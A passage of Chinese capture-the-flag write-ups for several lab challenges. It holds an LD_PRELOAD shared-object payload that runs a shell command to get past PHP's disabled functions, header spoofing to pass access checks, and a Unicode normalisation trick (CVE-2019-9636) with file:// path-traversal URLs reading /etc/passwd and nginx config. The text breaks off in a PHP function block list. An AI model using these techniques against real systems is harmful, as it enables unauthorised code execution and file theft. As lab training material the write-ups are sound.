string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__constructor__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">void</span> <span class=\"token function\">angel</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">unsetenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/readflag > /tmp/a1andns\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译成hack.so文件</p>\n<p><code>gcc 1.c -shared -fPIC -o hack.so</code></p>\n<p>把他上传到tmp目录下，这个看心情随意。</p>\n<p>在web根目录下新建一个php文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"LD_PRELOAD=/tmp/hack.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_log</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后去url处包含一下这个文件，<code>include(&#39;/tmp/alan.php&#39;);</code>就可以去tmp/a1andns查看flag了。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;b99df589-6ade-4a95-bc85-9ad652b6185a.node3.buuoj.cn&#x2F;?Ginkgo&#x3D;aW5jbHVkZSgnL3RtcC9hbGFuLnBocCcpOw&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201114202316621.png\" alt=\"image-20201114202316621\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201114202328417.png\" alt=\"image-20201114202328417\"></p>\n<h2 id=\"BJDCTF-2nd-假猪套天下第一\"><a href=\"#BJDCTF-2nd-假猪套天下第一\" class=\"headerlink\" title=\"[BJDCTF 2nd]假猪套天下第一\"></a>[BJDCTF 2nd]假猪套天下第一</h2><p><strong>考点：http</strong></p>\n<p>使用admin账号登录，弹窗说你不是admin，任意其他账号登录，可以在前端源码里发现一个L0g1n.php的存在</p>\n<p>访问这个L0g1n.php</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Sorry, this site will be available after totally 99 years!<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>发现cookie有带时间戳，所以要先绕过第一步。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">time&#x3D;4735115759<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后又得到了新的提示</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Sorry, this site is only optimized for those who comes from localhost<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用xxf来绕过，得到的回复是</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>好像失败了，不能用xxf</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">client-ip: 127.0.0.1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到回显是：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Sorry, this site is only optimized for those who come from gem-love.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>添加referer</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: gem-love.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>显示：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Sorry, this site is only optimized for browsers that run on Commodo 64<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改UA</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: Commodo 64<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>显示：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">no no no i think it is not the real commmodo 64, &lt;br&gt;what is the real ua for Commdo?<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改UA</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: Commodore 64<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>显示</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Sorry, this site is only optimized for those whose email is root@gem-love.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>添加From</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">From: root@gem-love.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>显示：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100&#x2F;Month<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>添加via</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">via: y1ng.vip<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>显示：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Sorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag &lt;!--ZmxhZ3s0ZTk2ZmVjMi0zNzNkLTRmMDktYjI0OS0wOTgzOTg5M2QxNmF9Cg&#x3D;&#x3D;--&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到了flag</p>\n<h2 id=\"SUCTF-2019-Pythonginx\"><a href=\"#SUCTF-2019-Pythonginx\" class=\"headerlink\" title=\"[SUCTF 2019]Pythonginx\"></a>[SUCTF 2019]Pythonginx</h2><p><strong>考点:nginx文件、代码审计、urlsplit()函数漏洞</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><strong>Nginx 重要文件目录</strong></p>\n<ul>\n<li>配置文件存放目录：/etc/nginx</li>\n<li>主要配置文件：/etc/nginx/conf/nginx.conf</li>\n<li>管理脚本：/usr/lib64/systemd/system/nginx.service</li>\n<li>模块：/usr/lisb64/nginx/modules</li>\n<li>应用程序：/usr/sbin/nginx</li>\n<li>程序默认存放位置：/usr/share/nginx/html</li>\n<li>日志默认存放位置：/var/log/nginx</li>\n</ul></blockquote>\n<p>给出了一段代码：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">        \n        <span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/getUrl'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    url <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"url\"</span><span class=\"token punctuation\">)</span>\n    host <span class=\"token operator\">=</span> parse<span class=\"token punctuation\">.</span>urlparse<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname\n    <span class=\"token keyword\">if</span> host <span class=\"token operator\">==</span> <span class=\"token string\">'suctf.cc'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"我扌 your problem? 111\"</span>\n    parts <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>urlsplit<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    host <span class=\"token operator\">=</span> parts<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">if</span> host <span class=\"token operator\">==</span> <span class=\"token string\">'suctf.cc'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"我扌 your problem? 222 \"</span> <span class=\"token operator\">+</span> host\n    newhost <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> host<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        newhost<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'idna'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    parts<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'.'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>newhost<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#去掉 url 中的空格</span>\n    finalUrl <span class=\"token operator\">=</span> urlunsplit<span class=\"token punctuation\">(</span>parts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n    host <span class=\"token operator\">=</span> parse<span class=\"token punctuation\">.</span>urlparse<span class=\"token punctuation\">(</span>finalUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname\n    <span class=\"token keyword\">if</span> host <span class=\"token operator\">==</span> <span class=\"token string\">'suctf.cc'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>urlopen<span class=\"token punctuation\">(</span>finalUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"我扌 your problem? 333\"</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>code<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span> Dont worry about the suctf<span class=\"token punctuation\">.</span>cc<span class=\"token punctuation\">.</span> Go on! <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span> Do you know the nginx? <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里需要绕过前面的俩个if语句，然后进入第三个if语句，并且通过传入的url读取文件。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>urlsplit()是 urllib.parse 模块下的一个函数，跟 urlparse 效果一样用来对 url 进行分割，但是有一点不一样的是 urlsplit 分割出来的没有 params 这个属性。</p>\n<p><strong>CVE-2019-9636：urlsplit 不处理 NFKC 标准化</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https://bugs.python.org/issue36216\">https://bugs.python.org/issue36216</a></p>\n<p><strong>CVE-2019-10160：urlsplit NFKD 标准化漏洞</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https://bugs.python.org/issue36742\">https://bugs.python.org/issue36742</a></p>\n<p><strong>漏洞原理：</strong></p>\n<p>用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。</p>\n<p>例如，在直接比较中，\\ uFF03不等于’＃’，而是统一化为’＃’，这会更改 URL 的片段部分。类似地，\\ u2100 统一化为’a/c’，它引入了路径段。</p></blockquote>\n<p>所以我们需要找一个字符来替换suctf.cc中的一个c</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> urllib<span class=\"token punctuation\">.</span>parse <span class=\"token keyword\">import</span> urlparse<span class=\"token punctuation\">,</span>urlunsplit<span class=\"token punctuation\">,</span>urlsplit\n<span class=\"token keyword\">from</span> urllib <span class=\"token keyword\">import</span> parse\n<span class=\"token keyword\">def</span> <span class=\"token function\">getUrl</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    url <span class=\"token operator\">=</span> url\n    host <span class=\"token operator\">=</span> parse<span class=\"token punctuation\">.</span>urlparse<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname\n    <span class=\"token keyword\">if</span> host <span class=\"token operator\">==</span> <span class=\"token string\">'suctf.cc'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n    parts <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>urlsplit<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    host <span class=\"token operator\">=</span> parts<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">if</span> host <span class=\"token operator\">==</span> <span class=\"token string\">'suctf.cc'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n    newhost <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> host<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        newhost<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'idna'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    parts<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'.'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>newhost<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#去掉 url 中的空格</span>\n    finalUrl <span class=\"token operator\">=</span> urlunsplit<span class=\"token punctuation\">(</span>parts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n    host <span class=\"token operator\">=</span> parse<span class=\"token punctuation\">.</span>urlparse<span class=\"token punctuation\">(</span>finalUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname\n    <span class=\"token keyword\">if</span> host <span class=\"token operator\">==</span> <span class=\"token string\">'suctf.cc'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_unicode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">65535</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        uni<span class=\"token operator\">=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        url<span class=\"token operator\">=</span><span class=\"token string\">\"http://suctf.c&#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>uni<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> getUrl<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str: \"</span><span class=\"token operator\">+</span>uni<span class=\"token operator\">+</span><span class=\"token string\">' unicode: \\\\u'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">pass</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    get_unicode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201115152102711.png\" alt=\"image-20201115152102711\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">str: ℂ unicode: \\u2102\nstr: ℭ unicode: \\u212d\nstr: Ⅽ unicode: \\u216d\nstr: ⅽ unicode: \\u217d\nstr: Ⓒ unicode: \\u24b8\nstr: ⓒ unicode: \\u24d2\nstr: Ｃ unicode: \\uff23\nstr: ｃ unicode: \\uff43<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这些都是可以用来成功替代其中的一个c的字符。</p>\n<p>例如：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;4dc9faf4-5102-4d4f-920d-2b84d6308f60.node3.buuoj.cn&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%84%82&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>etc/nginx/conf/nginx.conf并不存在</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;4dc9faf4-5102-4d4f-920d-2b84d6308f60.node3.buuoj.cn&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%84%82&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>内容:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">server &#123; listen 80; location &#x2F; &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock; &#125; location &#x2F;static &#123; alias &#x2F;app&#x2F;static; &#125; # location &#x2F;flag &#123; # alias &#x2F;usr&#x2F;fffffflag; # &#125; &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>发现了usr/fffffflag</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;4dc9faf4-5102-4d4f-920d-2b84d6308f60.node3.buuoj.cn&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%84%82&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;fffffflag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201115165103340.png\" alt=\"image-20201115165103340\"></p>\n<p>修改一下脚本就可以看到，在三次if语句执行前，host分别是什么值</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">suctf.cⅽ\nsuctf.cⅭ\nsuctf.cc\nhttp:&#x2F;&#x2F;suctf.cⅭ<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"网鼎杯-2020-朱雀组-phpweb\"><a href=\"#网鼎杯-2020-朱雀组-phpweb\" class=\"headerlink\" title=\"[网鼎杯 2020 朱雀组]phpweb\"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p><strong>考点：代码审计、反序列化</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;b&gt;Warning&lt;&#x2F;b&gt;:  date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;24&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;\n2020-11-15 09:01:52 am&lt;&#x2F;p&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>抓包可以发现，post了参数一个是函数名，一个是函数参数,所以直接用file_get_contents()函数来获取源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n <span class=\"token variable\">$disable_fun</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"shell_exec\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"passthru\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"proc_open\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"show_source\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"phpinfo\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"popen\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"dl\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"eval\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"proc_terminate\"</span><span class=\"token 